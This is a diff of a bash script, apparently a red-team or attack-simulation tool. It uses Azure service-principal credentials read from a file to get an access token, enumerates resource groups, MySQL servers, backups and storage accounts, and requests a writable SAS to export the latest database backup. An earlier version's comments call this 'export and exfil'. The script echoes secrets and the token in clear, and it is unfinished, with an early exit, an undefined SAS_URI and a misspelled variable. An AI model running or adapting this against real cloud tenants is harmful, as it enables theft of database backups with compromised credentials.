@@ -15,19 +15,115 @@ if ! command -v jq; then curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/re
 log "public ip: $(curl -s https://icanhazip.com)"
 
 # azure cred setup
-export AZURE_CLIENT_ID=$(jq -r '.clientId' ~/.azure/my.azureauth)
-export AZURE_CLIENT_SECRET=$(jq -r '.clientSecret' ~/.azure/my.azureauth)
-export AZURE_TENANT_ID=$(jq -r '.tenantId' ~/.azure/my.azureauth)
-export AZURE_SUBSCRIPTION_ID=$(jq -r '.subscriptionId' ~/.azure/my.azureauth)
-az login --service-principal -u $AZURE_CLIENT_ID -p $AZURE_CLIENT_SECRET --tenant $AZURE_TENANT_ID
+export AZURE_CREDS_PATH="./my.azureauth"
+# export AZURE_CREDS_PATH="~/.azure/my.azureauth"
+export AZURE_CLIENT_ID=$(jq -r '.clientId' $AZURE_CREDS_PATH)
+export AZURE_CLIENT_SECRET=$(jq -r '.clientSecret' $AZURE_CREDS_PATH)
+export AZURE_TENANT_ID=$(jq -r '.tenantId' $AZURE_CREDS_PATH)
+export AZURE_SUBSCRIPTION_ID=$(jq -r '.subscriptionId' $AZURE_CREDS_PATH)
+export IDENTITY_ENDPOINT="https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/token"
+# az login --service-principal -u $AZURE_CLIENT_ID -p $AZURE_CLIENT_SECRET --tenant $AZURE_TENANT_ID
 
 # cloud enumeration
-scout azure --file-auth ~/.azure/my.azureauth --report-dir /$SCRIPTNAME/scout-report --no-browser 2>&1 | tee -a $LOGFILE 
+#scout azure --file-auth ~/.azure/my.azureauth --report-dir /$SCRIPTNAME/scout-report --no-browser 2>&1 | tee -a $LOGFILE 
 
-# sql access - export and exfil
-# get parameter store credentials
-# auth to mysql and trigger backup? or can we use az cli?
-# depending on destintation we maybe need to get the output from a storage account and then copy locally
+echo "Authenticating service principal..."
+AUTH_RESULT=$(curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
+"${IDENTITY_ENDPOINT}" \
+-d "client_id=${AZURE_CLIENT_ID}" \
+-d "grant_type=client_credentials" \
+-d "resource=https://management.azure.com/" \
+-d "client_secret=${AZURE_CLIENT_SECRET}")
 
-az mysql flexible-server list
-az keyvault list
+cat <<EOF
+AUTH_RESULT=$AUTH_RESULT
+EOF
+
+TOKEN=$(echo $AUTH_RESULT | jq -r '.access_token')
+
+cat <<EOF
+TOKEN=$TOKEN
+EOF
+
+echo "Listing resource groups..."
+RESOURCE_GROUPS_RESULT=$(curl -s -X GET -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourcegroups?api-version=2021-04-01")
+
+cat <<EOF
+RESOURCE_GROUPS_RESULT=$RESOURCE_GROUPS_RESULT
+EOF
+
+echo "Finding resource group name for database..."
+RESOURCE_GROUP_NAME=$(echo $RESOURCE_GROUPS_RESULT | jq -r '.value[]| select(.name | startswith("resource-group-target")) | .name')
+DEPLOYMENT_ID=$(echo $RESOURCE_GROUPS_RESULT | jq -r '.value[] | select(.name | startswith("resource-group-target")) | .tags.deployment')
+
+cat <<EOF
+RESOURCE_GROUP_NAME=$RESOURCE_GROUP_NAME
+DEPLOYMENT_ID=$DEPLOYMENT_ID
+EOF
+
+echo "Listing flexible mysql servers..."
+# List SQL Flexible Servers within the specified resource group (mysql) Microsoft.DBforMySQL
+MYSQL_SERVERS=$(curl -s -X GET -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP_NAME}/providers/Microsoft.DBforMySQL/flexibleServers?api-version=2021-05-01")
+
+cat <<EOF
+MYSQL_SERVERS=$MYSQL_SERVERS
+EOF
+
+echo "Getting sql server name..."
+SERVER_NAME=$(echo $MYSQL_SERVERS | jq -r '.value[0].name')
+
+cat <<EOF
+SERVER_NAME=$SERVER_NAME
+EOF
+
+echo "Requesting a list of backups for $SERVER_NAME..."
+BACKUPS=$(curl -s -X GET -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP_NAME}/providers/Microsoft.DBforMySQL/flexibleServers/${SERVER_NAME}/backups?api-version=2023-10-01-preview")
+
+cat <<EOF
+BACKUPS=$BACKUPS
+EOF
+
+echo "Getting latest backup..."
+BACKUP_NAME=$(echo $BACKUPS | jq -r '.value[-1].name')
+
+#echo "Creating backup..."
+#CURRENT_DATE=$(date +%Y%m%d%H%M%S)
+#NEW_BACKUP_NAME="mybackup-${CURRENT_DATE}"
+#RESULT=$(curl -s -X PUT -H "content-length: 0" -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP_NAME}/providers/Microsoft.DBforMySQL/flexibleServers/${SERVER_NAME}/backups/${NEW_BACKUP_NAME}?api-version=2023-10-01-preview")
+
+#echo "Result..."
+#cat <<EOF
+#RESULT=$RESULT
+#EOF
+
+echo "Getting a list of storage accounts..."
+RESULT=$(curl -s -X GET -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.Storage/storageAccounts?api-version=2023-05-01")
+
+echo "Result..."
+cat <<EOF
+RESULT=$RESULT
+EOF
+
+echo "Finding db backup storage account..."
+DB_BACKUP_STORAGE_ACCOUNT_NAME=$(echo $RESULT | jq -r '.value[] | select(.id | contains("dbbackuptarget")) | .name')
+DB_BACKUP_STORAGE_ACCOUNT_ID=$(echo $RESULT | jq -r '.value[] | select(.id | contains("dbbackuptarget")) | .id')
+
+cat <<EOF
+DB_BACKUP_STORAGE_ACCOUNT_NAME=$DB_BACKUP_STORAGE_ACCOUNT_NAME
+DB_BACKUP_STORAGE_ACCOUNT_ID=$DB_BACKUP_STORAGE_ACCOUNT_ID
+EOF
+
+EXPIRY_TIME=$(date -u -d "+1 hour" +"%Y-%m-%dT%H:%M:%S.%7NZ")
+SAS_DATA="{\"canonicalizedResource\":\"/blob/${DB_BACKUP_STORAGE_ACCOUNT_NAME}/backup\",\"signedResource\":\"c\",\"signedPermission\":\"rcw\",\"signedProtocol\":\"https\",\"signedExpiry\":\"${EXPIRY_TIME}\"}"
+RESULT=$(curl -s -X POST -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP_NAME}/providers/Microsoft.Storage/storageAccounts/${DB_BACKUP_STORAGE_ACCOUNT_NAME}/listServiceSas/?api-version=2017-06-01"  -d ${SAS_DATA})
+
+cat <<EOF
+RESULT=$RESULT
+EOF
+
+exit
+
+EXPORT_DATA="{ \"targetDetails\": { \"objectType\": \"FullBackupStoreDetails\", \"sasUriList\": [ \"${SAS_URI}\" ] }, \"backupSettings\": { \"backupName\": \"${BACKUP_NAME}\" } }"
+
+echo "Exporting latest backup to storage account..."
+RESULT=$(curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP_NAME}/providers/Microsoft.DBforMySQL/flexibleServers/${SEVER_NAME}/backupAndExport?api-version=2023-10-01-preview" -d "" )
